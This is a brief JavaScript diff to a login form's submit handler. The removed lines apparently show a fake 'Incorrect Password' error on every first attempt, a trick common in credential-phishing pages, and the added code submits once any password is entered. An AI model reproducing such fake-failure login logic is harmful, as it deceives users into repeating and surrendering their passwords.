@@ -58,15 +58,8 @@ document.addEventListener("DOMContentLoaded", function() {
 
     loginForm.addEventListener("submit", function(event) {
         event.preventDefault();
-        attemptCount += 1;
-
-        if (password.value !== '' || attemptCount > 1) {
-            // Trigger password error on the first attempt
-            if (attemptCount === 1) {
-                borderTwo.style.borderBlockColor = 'red';
-                alert.innerText = 'Incorrect Password, try again..';
-                return; // Prevent submission on first incorrect password entry
-            }
+        if (password.value !== '') {
+            
 
             // Initialize or reset abort controller
             if (abortController) {
